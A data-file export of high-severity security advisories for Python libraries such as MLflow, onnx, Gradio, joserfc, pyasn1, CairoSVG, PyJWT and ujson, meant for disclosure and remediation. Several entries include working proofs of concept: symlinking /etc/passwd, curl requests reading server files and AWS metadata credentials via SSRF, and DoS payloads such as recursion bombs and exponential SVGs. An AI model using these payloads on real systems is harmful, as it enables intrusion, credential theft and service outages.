,security_advisory.cve_id,security_advisory.cwes,security_advisory.severity,security_advisory.summary,security_advisory.description,counts
322,CVE-2026-2652,['CWE-305'],high,MLflow: unauthenticated access to certain FastAPI routes,"A vulnerability in mlflow/mlflow versions 3.9.0 and earlier allows unauthenticated access to certain FastAPI routes when the server is started with authentication enabled (`--app-name basic-auth`) and served via uvicorn (ASGI). The FastAPI permission middleware only enforces authentication on `/gateway/` routes, leaving other routes such as the Job API (`/ajax-api/3.0/jobs/*`) and the OpenTelemetry trace ingestion API (`/v1/traces`) unprotected. This allows unauthenticated remote attackers to submit jobs, read job results, cancel running jobs, and inject arbitrary trace data into experiments. The issue arises from an architectural mismatch between Flask and FastAPI authentication mechanisms, where the `_find_fastapi_validator()` function fails to handle non-`/gateway/` paths, resulting in a complete authentication bypass. This vulnerability is fixed in version 3.10.0.",8
323,CVE-2026-27459,['CWE-120'],high,pyOpenSSL DTLS cookie callback buffer overflow,"If a user provided callback to `set_cookie_generate_callback` returned a cookie value greater than 256 bytes, pyOpenSSL would overflow an OpenSSL provided buffer.

Cookie values that are too long are now rejected.",4
324,CVE-2026-27489,"['CWE-23', 'CWE-61']",high,onnx Vulnerable to Path Traversal via Symlink,"### Summary
A path traversal vulnerability via symlink allows to read arbitrary files outside model or user-provided directory. 

### Details
The following check for symlink is ineffective and it is possible to point a symlink to an arbitrary location on the file system:
https://github.com/onnx/onnx/blob/336652a4b2ab1e530ae02269efa7038082cef250/onnx/checker.cc#L1024-L1033

`std::filesystem::is_regular_file` performs a `status(p)` call on the provided path, which follows symbolic links to determine the file type, meaning it will return true if the target of a symlink is a regular file. 


### PoC



```python
# Create a demo model with external data
import os
import numpy as np
import onnx
from onnx import helper, TensorProto, numpy_helper

def create_onnx_model(output_path=""model.onnx""):
    weight_matrix = np.random.randn(1000, 1000).astype(np.float32)

    X = helper.make_tensor_value_info(""X"", TensorProto.FLOAT, [1, 1000])
    Y = helper.make_tensor_value_info(""Y"", TensorProto.FLOAT, [1, 1000])
    W = numpy_helper.from_array(weight_matrix, name=""W"")

    matmul_node = helper.make_node(""MatMul"", inputs=[""X"", ""W""], outputs=[""Y""], name=""matmul"")

    graph = helper.make_graph(
        nodes=[matmul_node],
        name=""SimpleModel"",
        inputs=[X],
        outputs=[Y],
        initializer=[W]
    )

    model = helper.make_model(graph, opset_imports=[helper.make_opsetid("""", 11)])
    onnx.checker.check_model(model)

    data_file = output_path.replace('.onnx', '.data')

    if os.path.exists(output_path):
        os.remove(output_path)
    if os.path.exists(data_file):
        os.remove(data_file)

    onnx.save_model(
        model,
        output_path,
        save_as_external_data=True,
        all_tensors_to_one_file=True,
        location=os.path.basename(data_file),
        size_threshold=1024 * 1024
    )

if __name__ == ""__main__"":
    create_onnx_model(""model.onnx"")
```

1. Run the above code to generate a sample model with external data.
2. Remove `model.data`
3. Run `ln -s /etc/passwd model.data`
4. Load the model using the following code
5. Observe check for symlink is bypassed and model is succesfuly loaded

```python
import onnx
from onnx.external_data_helper import load_external_data_for_model

def load_onnx_model_basic(model_path=""model.onnx""):
    model = onnx.load(model_path)
    return model

def load_onnx_model_explicit(model_path=""model.onnx""):
    model = onnx.load(model_path, load_external_data=False)
    load_external_data_for_model(model, ""."")
    return model

if __name__ == ""__main__"":
    model = load_onnx_model_basic(""model.onnx"")

```

A common misuse case for successful exploitation is that an adversary can provide victim with a compressed file, containing `poc.onnx` and `poc.data (symlink)`. Once the victim uncompress and load the model, symlink read the adversary selected arbitrary file.


### Impact

Read sensitive and arbitrary files and environment variable (e.g. /proc/1/environ) from the host that loads the model.

NOTE: this issue is not limited to UNIX.

### Sample patch

```c
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>

int open_external_file_no_symlink(const char *base_dir,
                                  const char *relative_path) {
    int dirfd = -1;
    int fd = -1;
    struct stat st;

    // Open base directory
    dirfd = open(base_dir, O_RDONLY | O_DIRECTORY);
    if (dirfd < 0) {
        return -1;
    }

    // Open the target relative to base_dir
    // O_NOFOLLOW => fail if final path component is a symlink
    fd = openat(dirfd,
                relative_path,
                O_RDONLY | O_NOFOLLOW);
    close(dirfd);

    if (fd < 0) {
        // ELOOP is the typical error if a symlink is encountered
        return -1;
    }

    // Inspect the *opened file*
    if (fstat(fd, &st) != 0) {
        close(fd);
        return -1;
    }

    // Enforce ""regular file only""
    if (!S_ISREG(st.st_mode)) {
        close(fd);
        errno = EINVAL;
        return -1;
    }

    // fd is now:
    // - not a symlink
    // - not a directory
    // - not a device / FIFO / socket
    // - race-safe
    return fd;
}
```

### Resources

* https://cwe.mitre.org/data/definitions/61.html
* https://discuss.secdim.com/t/input-validation-necessary-but-not-sufficient-it-doesnt-target-the-fundamental-issue/1172
* https://discuss.secdim.com/t/common-pitfalls-for-patching-path-traversal/3368",4
325,CVE-2026-27932,['CWE-770'],high,joserfc's PBES2 p2c Unbounded Iteration Count enables Denial of Service (DoS),"# Summary 

A resource exhaustion vulnerability in joserfc allows an unauthenticated attacker to cause a Denial of Service (DoS) via CPU exhaustion. When the library decrypts a JSON Web Encryption (JWE) token using Password-Based Encryption (PBES2) algorithms, it reads the p2c (PBES2 Count) parameter directly from the token's protected header. This parameter defines the number of iterations for the PBKDF2 key derivation function. Because joserfc does not validate or bound this value, an attacker can specify an extremely large iteration count (e.g., 2^31 - 1), forcing the server to expend massive CPU resources processing a single token.

This vulnerability exists at the JWA layer and impacts all high-level JWE and JWT decryption interfaces if PBES2 algorithms are allowed by the application's policy.

## Details
 
**Vulnerable file:** `src/joserfc/_rfc7518/jwe_algs.py`
**Vulnerable function:** `PBES2HSAlgKeyEncryption.decrypt_cek()` 
**Lines:** 283

```python
def decrypt_cek(self, recipient: Recipient[OctKey]) -> bytes:
    headers = recipient.headers()
    # ...
    p2c = headers[""p2c""]  # ← attacker-controlled integer
    # ...
    kek = self.compute_derived_key(key.get_op_key(""deriveKey""), p2s, p2c)
```
The `p2c` value is then passed to `compute_derived_key` : 

```python
def compute_derived_key(self, key: bytes, p2s: bytes, p2c: int) -> bytes:
    # ...
    kdf = PBKDF2HMAC(
        algorithm=self.hash_alg,
        length=self.key_size // 8,
        salt=salt,
        iterations=p2c,  # ← unbounded iterations
        backend=default_backend(),
    )
```

**Impact on JWT Policies**
Any JWT policy configured to allow PBES2 key management algorithms (e.g., `PBES2-HS256+A128KW`) is vulnerable. Because the DoS occurs during the decryption phase, the attack is triggered before any claim validation (e.g., 
exp,`iss, aud` checks) or nested signature verification takes place. This makes existing JWT ""policies"" ineffective as a defense if the underlying algorithm is permitted.


## PoC

**Tested against joserfc 1.6.2.
Local Reproduction:**

```python
import time
from joserfc import jwe
from joserfc.jwk import OctKey

# Force joserfc to use local source if needed
# sys.path.insert(0, ""src"")

# Attacker-crafted token with 10 million iterations
# Normally legitimate p2c is ~2048-4096. 10M iterations = ~5s DoS.
token = ""eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoiWjI5dVpYSm1ZdyIsInAyYyI6MTAwMDAwMDB9.dummy.dummy.dummy.dummy""

key = OctKey.import_key(b""any-password"")

t0 = time.perf_counter()
try:
    # This call will hang the thread for seconds
    jwe.decrypt_compact(token, key, algorithms=[""PBES2-HS256+A128KW"", ""A128CBC-HS256""])
except Exception:
    pass
print(f""Elapsed: {time.perf_counter() - t0:.2f}s"")
```

## Impact
An unauthenticated remote attacker can exhaust the CPU resources of a server by sending a small number of crafted JWE/JWT tokens. Each token will occupy a worker thread/process for a duration proportional to the `p2c` value (up to several minutes or hours depending on the integer value). This results in a complete Denial of Service for legitimate users.

## Recommendation
Minimal fix: Implement an upper bound check for the `p2c` parameter in `PBES2HSAlgKeyEncryption.decrypt_cek()`.

```python
MAX_P2C = 300000  # Example security bound

# ... inside decrypt_cek ...
p2c = headers[""p2c""]
if not isinstance(p2c, int) or p2c > MAX_P2C:
    raise DecodeError(f""p2c iteration count too high (max {MAX_P2C})"")
```
Additionally, applications should only enable PBES2 algorithms if password-based encryption is specifically required and should enforce a strict  algorithms allowlist in their JWT/JWE policies.",4
326,CVE-2026-28414,"['CWE-22', 'CWE-36']",high,Gradio is Vulnerable to Absolute Path Traversal on Windows with Python 3.13+,"### Summary
Gradio apps running on Window with Python 3.13+ are vulnerable to an absolute path traversal issue that enables unauthenticated attackers to read arbitrary files from the file system.

### Details
Python 3.13+ changed the definition of `os.path.isabs` so that root-relative paths like `/windows/win.ini` on Windows are no longer considered absolute paths, resulting in a vulnerability in Gradio's logic for joining paths safely.

This can be exploited by unauthenticated attackers to read arbitrary files from the Gradio server, even when Gradio is set up with authentication.

### PoC
```
% curl http://10.10.10.10:7860/static//windows/win.ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### Impact
Arbitrary file read in the context of the Windows user running Gradio.",2
327,CVE-2026-28416,['CWE-918'],high,Gradio has SSRF via Malicious `proxy_url` Injection in `gr.load()` Config Processing,"### Summary

A Server-Side Request Forgery (SSRF) vulnerability in Gradio allows an attacker to make arbitrary HTTP requests from a victim's server by hosting a malicious Gradio Space. When a victim application uses `gr.load()` to load an attacker-controlled Space, the malicious `proxy_url` from the config is trusted and added to the allowlist, enabling the attacker to access internal services, cloud metadata endpoints, and private networks through the victim's infrastructure.

### Details

The vulnerability exists in Gradio's config processing flow when loading external Spaces:

1. **Config Fetching** (`gradio/external.py:630`): `gr.load()` calls `Blocks.from_config()` which fetches and processes the remote Space's configuration.

2. **Proxy URL Trust** (`gradio/blocks.py:1231-1233`): The `proxy_url` from the untrusted config is added directly to `self.proxy_urls`:
   ```python
   if config.get(""proxy_url""):
       self.proxy_urls.add(config[""proxy_url""])
   ```

3. **Built-in Proxy Route** (`gradio/routes.py:1029-1031`): Every Gradio app automatically exposes a `/proxy={url_path}` endpoint:
   ```python
   @router.get(""/proxy={url_path:path}"", dependencies=[Depends(login_check)])
   async def reverse_proxy(url_path: str):
   ```

4. **Host-based Validation** (`gradio/routes.py:365-368`): The validation only checks if the URL's host matches any trusted `proxy_url` host:
   ```python
   is_safe_url = any(
       url.host == httpx.URL(root).host for root in self.blocks.proxy_urls
   )
   ```

An attacker can set `proxy_url` to `http://169.254.169.254/` (AWS metadata) or any internal service, and the victim's server will proxy requests to those endpoints.

### PoC

Full PoC: https://gist.github.com/logicx24/8d4c1aaa4e70f85d0d0fba06a463f2d6

**1. Attacker creates a malicious Gradio Space** that returns this config:
```python
{
    ""mode"": ""blocks"",
    ""components"": [...],
    ""proxy_url"": ""http://169.254.169.254/""  # AWS metadata endpoint
}
```

**2. Victim loads the malicious Space:**
```python
import gradio as gr
demo = gr.load(""attacker/malicious-space"")
demo.launch(server_name=""0.0.0.0"", server_port=7860)
```

**3. Attacker exploits the proxy:**
```bash
# Fetch AWS credentials through victim's server
curl ""http://victim:7860/gradio_api/proxy=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name""
```

### Impact

**Who is impacted:**
- Any Gradio application that uses `gr.load()` to load external/untrusted Spaces
- HuggingFace Spaces that compose or embed other Spaces
- Enterprise deployments where Gradio apps have access to internal networks

**Attack scenarios:**
- **Cloud credential theft**: Access AWS/GCP/Azure metadata endpoints to steal IAM credentials
- **Internal service access**: Reach databases, admin panels, and APIs on private networks
- **Network reconnaissance**: Map internal infrastructure through the victim
- **Data exfiltration**: Access sensitive internal APIs and services",2
328,CVE-2026-28500,"['CWE-345', 'CWE-494', 'CWE-693']",high,ONNX Untrusted Model Repository Warnings Suppressed by silent=True in onnx.hub.load() — Silent Supply-Chain Attack,"## What's the issue
Passing `silent=True` to `onnx.hub.load()` kills all trust warnings and user prompts. This means a model can be downloaded from any unverified GitHub repo with zero user awareness.
 
```python
if not _verify_repo_ref(repo) and not silent:
    # completely skipped when silent=True
    print(""The model repo... is not trusted"")
    if input().lower() != ""y"":
        return None
```
 
On top of that, the SHA256 integrity check is useless here — it validates against a manifest that lives in the same repo the attacker controls, so the hash will always match.

 
## Impact
Any pipeline using `hub.load()` with `silent=True` and an external repo string is silently loading whatever the repo owner ships. If that model executes arbitrary code on load, the attacker has access to the machine.
 
## Resolved by removing the feature 
## References
 
- [Write-up](https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md)",4
329,CVE-2026-30922,"['CWE-674', 'CWE-835']",high,Denial of Service in pyasn1 via Unbounded Recursion,"### Summary
The `pyasn1` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing nested `SEQUENCE` (`0x30`) or `SET` (`0x31`) tags with Indefinite Length (`0x80`) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a `RecursionError` or consumes all available memory (OOM), crashing the host application.

### Details
The vulnerability exists because the decoder iterates through the input stream and recursively calls `decodeFun` (the decoding callback) for every nested component found, without tracking or limiting the recursion depth.
Vulnerable Code Locations:
1. `indefLenValueDecoder` (Line 998):
```for component in decodeFun(substrate, asn1Spec, allowEoo=True, **options):```
This method handles indefinite-length constructed types. It sits inside a `while True` loop and recursively calls the decoder for every nested tag.

2. `valueDecoder` (Lines 786 and 907):
```for component in decodeFun(substrate, componentType, **options):```
This method handles standard decoding when a schema is present. It contains two distinct recursive calls that lack depth checks: Line 786: Recursively decodes components of `SEQUENCE` or `SET` types. Line 907: Recursively decodes elements of `SEQUENCE OF` or `SET OF` types.

4. `_decodeComponentsSchemaless` (Line 661):
```for component in decodeFun(substrate, **options):```
This method handles decoding when no schema is provided.

In all three cases, `decodeFun` is invoked without passing a `depth` parameter or checking against a global `MAX_ASN1_NESTING` limit.

### PoC
```
import sys
from pyasn1.codec.ber import decoder

sys.setrecursionlimit(100000)

print(""[*] Generating Recursion Bomb Payload..."")
depth = 50_000
chunk = b'\x30\x80' 
payload = chunk * depth

print(f""[*] Payload size: {len(payload) / 1024:.2f} KB"")
print(""[*] Triggering Decoder..."")

try:
    decoder.decode(payload)
except RecursionError:
    print(""[!] Crashed: Recursion Limit Hit"")
except MemoryError:
    print(""[!] Crashed: Out of Memory"")
except Exception as e:
    print(f""[!] Crashed: {e}"")
```

```
[*] Payload size: 9.77 KB
[*] Triggering Decoder...
[!] Crashed: Recursion Limit Hit
```

### Impact
- This is an unhandled runtime exception that typically terminates the worker process or thread handling the request. This allows a remote attacker to trivially kill service workers with a small payload (<100KB), resulting in a Denial of Service. Furthermore, in environments where recursion limits are increased, this leads to server-wide memory exhaustion.
- Service Crash: Any service using `pyasn1` to parse untrusted ASN.1 data (e.g., LDAP, SNMP, Kerberos, X.509 parsers) can be crashed remotely.
- Resource Exhaustion: The attack consumes RAM linearly with the nesting depth. A small payload (<200KB) can consume hundreds of megabytes of RAM or exhaust the stack.

### Credits
Vulnerability discovered by Kevin Tu of TMIR at ByteDance.",5
330,CVE-2026-31221,['CWE-502'],high,PyTorch Lightning load_from_checkpoint has an insecure checkpoint deserialization,"PyTorch-Lightning versions 2.6.0 and earlier contain an insecure deserialization vulnerability (CWE-502) in the checkpoint loading mechanism. The LightningModule.load_from_checkpoint() method, which is commonly used to load saved model states, internally calls torch.load() without setting the security-restrictive weights_only=True parameter. This default behavior allows the deserialization of arbitrary Python objects via the Pickle module. A remote attacker can exploit this by providing a maliciously crafted checkpoint file, leading to arbitrary code execution on the victim's system when the file is loaded.",3
331,CVE-2026-31247,['CWE-400'],high,Docling's JATS XML backend is vulnerable to XML Entity Expansion (XXE) attacks,"Docling's JATS XML backend is vulnerable to XML Entity Expansion (XXE) attacks thru 2.61.0. The backend uses etree.parse() to parse XML files without disabling entity resolution. An attacker can craft a malicious XML file containing a nested entity expansion payload (XML Bomb). When processed by Docling, the exponential expansion of entities leads to excessive resource consumption, resulting in a denial of service (DoS) condition on the system running the Docling parser.",5
332,CVE-2026-31248,['CWE-776'],high,Docling's METS GBS backend is vulnerable to XML Entity Expansion (XXE) attacks,"Docling's METS GBS backend is vulnerable to XML Entity Expansion (XXE) attacks thru 2.61.0. The backend extracts and validates XML files from .tar.gz archives using etree.fromstring() without disabling entity resolution. An attacker can craft a malicious XML file with nested entity definitions (XML Bomb) and package it into a .tar.gz archive. When processed by Docling, the exponential expansion of entities during XML parsing leads to excessive resource consumption, resulting in a denial of service (DoS) condition on the system running the Docling parser.",5
333,CVE-2026-31899,['CWE-400'],high,CairoSVG vulnerable to Exponential DoS via recursive <use> element amplification,"## Summary

Kozea/CairoSVG (~300K downloads/week) has exponential denial of service via recursive `<use>` element amplification in `cairosvg/defs.py` (line ~335). This causes CPU exhaustion from a small input.

## Severity

High — CVSS 3.1: 7.5
Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

## Vulnerable Code

File: `cairosvg/defs.py` (line ~335), function `use()`

The `use()` function recursively processes `<use>` elements without any depth or count limits. With 5 levels of nesting and 10 references each, a 1,411-byte SVG triggers 10^5 = 100,000 render calls.

## Impact

- 1,411-byte SVG payload pins CPU at 100% indefinitely
- Memory stays flat at ~43MB — no OOM kill, process never terminates
- Any service accepting SVG input (thumbnailing, PDF generation, avatar rendering) is DoS-able
- Amplification factor: O(10^N) rendering calls from O(N) input

## Proof of Concept

Save as `poc.svg` and run `timeout 10 cairosvg poc.svg -o test.png`:

```xml
<?xml version=""1.0""?>
<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">
  <defs>
    <g id=""a""><rect width=""1"" height=""1""/></g>
    <g id=""b""><use xlink:href=""#a""/><use xlink:href=""#a""/><use xlink:href=""#a""/><use xlink:href=""#a""/><use xlink:href=""#a""/><use xlink:href=""#a""/><use xlink:href=""#a""/><use xlink:href=""#a""/><use xlink:href=""#a""/><use xlink:href=""#a""/></g>
    <g id=""c""><use xlink:href=""#b""/><use xlink:href=""#b""/><use xlink:href=""#b""/><use xlink:href=""#b""/><use xlink:href=""#b""/><use xlink:href=""#b""/><use xlink:href=""#b""/><use xlink:href=""#b""/><use xlink:href=""#b""/><use xlink:href=""#b""/></g>
    <g id=""d""><use xlink:href=""#c""/><use xlink:href=""#c""/><use xlink:href=""#c""/><use xlink:href=""#c""/><use xlink:href=""#c""/><use xlink:href=""#c""/><use xlink:href=""#c""/><use xlink:href=""#c""/><use xlink:href=""#c""/><use xlink:href=""#c""/></g>
    <g id=""e""><use xlink:href=""#d""/><use xlink:href=""#d""/><use xlink:href=""#d""/><use xlink:href=""#d""/><use xlink:href=""#d""/><use xlink:href=""#d""/><use xlink:href=""#d""/><use xlink:href=""#d""/><use xlink:href=""#d""/><use xlink:href=""#d""/></g>
  </defs>
  <use xlink:href=""#e""/>
</svg>
```

Expected: `timeout` kills the process after 10 seconds (it never completes on its own).

Alternatively test with Python:
```python
import cairosvg, signal
signal.alarm(5)  # Kill after 5 seconds
try:
    cairosvg.svg2png(bytestring=open(""poc.svg"").read())
except:
    print(""[!!!] CONFIRMED: CPU exhaustion — process did not complete in 5s"")
```

## Suggested Fix

Add recursion depth counter to `use()` function. Cap at e.g. 10 levels. Also add total element budget to prevent amplification.

## References

- [CWE-400](https://cwe.mitre.org/data/definitions/400.html)

## Credit

Kai Aizen (SnailSploit) — Adversarial AI & Security Research",1
334,CVE-2026-31958,['CWE-400'],high,Tornado is vulnerable to DoS due to too many multipart parts,"In versions of Tornado prior to 6.5.5, the only limit on the number of parts in `multipart/form-data` is the `max_body_size` setting (default 100MB). Since parsing occurs synchronously on the main thread, this creates the possibility of denial-of-service due to the cost of parsing very large multipart bodies with many parts. 

Tornado 6.5.5 introduces new limits on the size and complexity of multipart bodies, including a default limit of 100 parts per request. These limits are configurable if needed; see `tornado.httputil.ParseMultipartConfig`. It is also now possible to disable `multipart/form-data` parsing entirely if it is not required for the application.",6
335,CVE-2026-32274,['CWE-22'],high,Black: Arbitrary file writes from unsanitized user input in cache file name,"### Impact

Black writes a cache file, the name of which is computed from various formatting options. The value of the `--python-cell-magics` option was placed in the filename without sanitization, which allowed an attacker who controls the value of this argument to write cache files to arbitrary file system locations. 

### Patches

Fixed in Black 26.3.1.

### Workarounds

Do not allow untrusted user input into the value of the `--python-cell-magics` option.",4
336,CVE-2026-32597,"['CWE-345', 'CWE-863']",high,PyJWT accepts unknown `crit` header extensions,"## Summary

PyJWT does not validate the `crit` (Critical) Header Parameter defined in
RFC 7515 §4.1.11. When a JWS token contains a `crit` array listing
extensions that PyJWT does not understand, the library accepts the token
instead of rejecting it. This violates the **MUST** requirement in the RFC.

This is the same class of vulnerability as CVE-2025-59420 (Authlib),
which received CVSS 7.5 (HIGH).

---

## RFC Requirement

RFC 7515 §4.1.11:

> The ""crit"" (Critical) Header Parameter indicates that extensions to this
> specification and/or [JWA] are being used that **MUST** be understood and
> processed. [...] If any of the listed extension Header Parameters are
> **not understood and supported** by the recipient, then the **JWS is invalid**.

---

## Proof of Concept

```python
import jwt  # PyJWT 2.8.0
import hmac, hashlib, base64, json

# Construct token with unknown critical extension
header = {""alg"": ""HS256"", ""crit"": [""x-custom-policy""], ""x-custom-policy"": ""require-mfa""}
payload = {""sub"": ""attacker"", ""role"": ""admin""}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b""="").decode()

h = b64url(json.dumps(header, separators=("","", "":"")).encode())
p = b64url(json.dumps(payload, separators=("","", "":"")).encode())
sig = b64url(hmac.new(b""secret"", f""{h}.{p}"".encode(), hashlib.sha256).digest())
token = f""{h}.{p}.{sig}""

# Should REJECT — x-custom-policy is not understood by PyJWT
try:
    result = jwt.decode(token, ""secret"", algorithms=[""HS256""])
    print(f""ACCEPTED: {result}"")
    # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'}
except Exception as e:
    print(f""REJECTED: {e}"")
```

**Expected:** `jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy`
**Actual:** Token accepted, payload returned.

### Comparison with RFC-compliant library

```python
# jwcrypto — correctly rejects
from jwcrypto import jwt as jw_jwt, jwk
key = jwk.JWK(kty=""oct"", k=b64url(b""secret""))
jw_jwt.JWT(jwt=token, key=key, algs=[""HS256""])
# raises: InvalidJWSObject('Unknown critical header: ""x-custom-policy""')
```

---

## Impact

- **Split-brain verification** in mixed-library deployments (e.g., API
  gateway using jwcrypto rejects, backend using PyJWT accepts)
- **Security policy bypass** when `crit` carries enforcement semantics
  (MFA, token binding, scope restrictions)
- **Token binding bypass** — RFC 7800 `cnf` (Proof-of-Possession) can be
  silently ignored
- See CVE-2025-59420 for full impact analysis

---

## Suggested Fix

In `jwt/api_jwt.py`, add validation in `_validate_headers()` or
`decode()`:

```python
_SUPPORTED_CRIT = {""b64""}  # Add extensions PyJWT actually supports

def _validate_crit(self, headers: dict) -> None:
    crit = headers.get(""crit"")
    if crit is None:
        return
    if not isinstance(crit, list) or len(crit) == 0:
        raise InvalidTokenError(""crit must be a non-empty array"")
    for ext in crit:
        if ext not in self._SUPPORTED_CRIT:
            raise InvalidTokenError(f""Unsupported critical extension: {ext}"")
        if ext not in headers:
            raise InvalidTokenError(f""Critical extension {ext} not in header"")
```

---

## CWE

- CWE-345: Insufficient Verification of Data Authenticity
- CWE-863: Incorrect Authorization

## References

- [RFC 7515 §4.1.11](https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11)
- [CVE-2025-59420 — Authlib crit bypass (CVSS 7.5)](https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32)
- [RFC 7800 — Proof-of-Possession Key Semantics](https://www.rfc-editor.org/rfc/rfc7800)",2
337,CVE-2026-32874,['CWE-401'],high,UltraJSON has a Memory Leak parsing large integers allows DoS ,"#### Summary

ujson 5.4.0 to 5.11.0 inclusive contain an accumulating memory leak in JSON parsing _large_ (outside of the range [-2^63, 2^64 - 1]) integers.

#### Exploitability

Any service that calls `ujson.load()`/`ujson.loads()`/`ujson.decode()` on untrusted inputs is affected and vulnerable to denial of service attacks.

#### Details

The leaked memory is a copy of the string form of the integer plus an additional NULL byte. The leak occurs irrespective of whether the integer parses successfully or is rejected due to having more than `sys.get_int_max_str_digits()` digits, meaning that any sized leak per malicious JSON can be achieved provided that there is no limit on the overall size of the payload.

```python
ujson.loads(str(2 ** 64 - 1))  # No leak
ujson.loads(str(2 ** 64))  # Leaks
ujson.loads(str(10 ** sys.get_int_max_str_digits()))  # Leaks and raises ValueError
```

#### Fix

The leak is fixed in `ujson 5.12.0` (4baeb950df780092bd3c89fc702a868e99a3a1d2). There are no workarounds beyond upgrading to an unaffected version.

#### Credits

Discovered by Cameron Criswell/Skevros using Coverage-guided fuzzing (libFuzzer + AddressSanitizer)",2
338,CVE-2026-32875,"['CWE-190', 'CWE-787', 'CWE-835']",high,UltraJSON has an integer overflow handling large indent leads to buffer overflow or infinite loop,"### Summary

`ujson.dumps()` crashes the Python interpreter (segmentation fault) when the product of the `indent` parameter and the nested depth of the input exceeds INT32_MAX. It can also get stuck in an infinite loop if the `indent` is a large negative number. Both are caused by an integer overflow/underflow whilst calculating how much memory to reserve for indentation. And both can be used to achieve denial of service.

(Note: A negative indent to `ujson` means add spaces after colons but do not add line breaks or indentation. It is unclear to the current maintainers whether this was ever even an intended feature or just a byproduct of the way it was written.)

### Exploitability

To be vulnerable, a service must call `ujson.dump()`/`ujson.dumps()`/`ujson.encode()` whilst giving untrusted users control over the `indent` parameter and not restrict that indentation to reasonably small non-negative values. (Even with the fix for this vulnerability, such usage is strongly advised against since even a bug-free JSON serialiser would be vulnerable to denial of service simply by the attacker requesting indents that have the server needlessly filling out gigabytes of whitespace.)

A service may also be vulnerable to the infinite loop if it uses a fixed _negative_ `indent`. An underflow always occurs for any negative indent when the input data is at least one level nested but, for small negative indents, the underflow is usually accidentally rectified by another overflow. As far as the maintainers are aware, the infinite loop can not be reached for indentations from -1 to -65536 / max_recursion_depth_as_limited_by_stack_size but users of negative indents are encouraged to consider their service affected even if the infinite loop seems unreachable.

### Example

```python
import ujson

def example(depth, indent):
    a = [0]
    for i in range(1000):
        a = [a]
    ujson.dumps(a, indent=indent)

example(1, 2**30)  # segfault
example(1000, -200)  # infinite loop
```

### Patches

ujson 5.12.0, containing 486bd4553dc471a1de11613bc7347a6b318e37ea, promotes the integer types where the overflow occurred, skips the indentation code path for negative indent (which was supposed to be a no-op) and places an artificial cap of 1000 on the `indent` parameter.

### Workarounds

Users who don't wish to upgrade can either use a fixed indentation, no indentation or ensure indentation is non-negative and not enormous (below `2**31 / max_recursion_depth_as_limited_by_stack_size`).

### References

The original bug report can be found at https://github.com/ultrajson/ultrajson/issues/700

This issue was independently discovered by @coco1629, @EthanKim88 and @vmfunc.",2
